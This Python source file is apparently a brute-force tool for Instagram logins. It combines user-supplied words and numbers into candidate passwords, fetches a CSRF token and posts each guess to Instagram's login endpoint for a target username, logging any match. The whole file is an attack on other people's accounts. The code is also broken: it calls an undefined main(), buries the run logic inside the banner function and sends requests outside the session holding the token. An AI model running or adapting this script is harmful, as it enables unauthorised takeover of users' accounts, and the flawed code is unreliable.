import requests
import string
import random

def generate_passwords(words, numbers):
    passwords = []
    for word in words:
        for num in numbers:
            passwords.append(word + num)
    return passwords

def get_csrf_token(session):
    url = "https://www.instagram.com/accounts/login/"
    response = session.get(url)
    if response.status_code == 200:
        return response.cookies.get('csrftoken')
    return None

def test_passwords(username, passwords):
    url = "https://www.instagram.com/accounts/login/ajax/"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
        "X-Requested-With": "XMLHttpRequest",
        "X-CSRFToken": "",
        "X-Instagram-AJAX": "1",
    }

    session = requests.Session()

    
    # Fetch the CSRF token
    csrf_token = get_csrf_token(session)
    if not csrf_token:
        print("Failed to fetch CSRF token")
        return []

    headers["X-CSRFToken"] = csrf_token

    payload = {
        "username": username,
        "enc_password": "",
        "device_id": "",
    }

    results = []

    for password in passwords:
        payload["enc_password"] = password
        response = requests.post(url, data=payload, headers=headers)

        try:
            response_json = response.json()
            if "logged_in_user" in response_json:
                results.append(f"Password found: {password}")
            else:
                results.append(f"Password tested: {password} - Failed")
        except requests.exceptions.JSONDecodeError:
            results.append(f"Password tested: {password} - Failed (Invalid JSON response)")

    return results

def save_results(results, filename="results.txt"):
    with open(filename, "w") as file:
        for result in results:
            file.write(result + "\n")
    print(f"Results saved to {filename}")

def print_banner():
    print("""
    /$$     /$$ /$$$$$$             /$$      /$$$$$$
    |  $$   /$$/|_  $$_/            | $$     /$$__  $$
     \  $$ /$$/   | $$   /$$$$$$$  /$$$$$$  | $$  \ $$  /$$$$$$   /$$$$$$  /$$$$$$$  /$$$$$$$  /$$$$$$
      \  $$$$/    | $$  | $$__  $$|_  $$_/  | $$$$$$$$ /$$__  $$ /$$__  $$| $$__  $$|_  $$_/   | $$  |  $$$$$$/
       \  $$/     | $$  | $$  \ $$  | $$    | $$__  $$| $$  \ $$| $$$$$$$$| $$  \ $$  | $$     | $$   >$$__  $$
        | $$      | $$  | $$  | $$  | $$ /$$| $$  | $$| $$  | $$| $$_____/| $$  | $$  | $$ /$$ | $$  | $$  \ $$
        | $$     /$$$$$$| $$  | $$  |  $$$$/| $$  | $$|  $$$$$$$|  $$$$$$$| $$  | $$  |  $$$$//$$$$$$|  $$$$$$/
        |__/    |______/|__/  |__/   \___/  |__/  |__/ \____  $$ \_______/|__/  |__/   \___/ |______/ \______/
                                                  /$$  \ $$
                                                 |  $$$$$$/
                                                  \______/
    """)

    words = input("Enter words separated by spaces: ").split()
    numbers = input("Enter numbers separated by spaces: ").split()
    username = input("Enter Instagram username: ")

    passwords = generate_passwords(words, numbers)
    results = test_passwords(username, passwords)
    save_results(results)

if __name__ == "__main__":
    main()
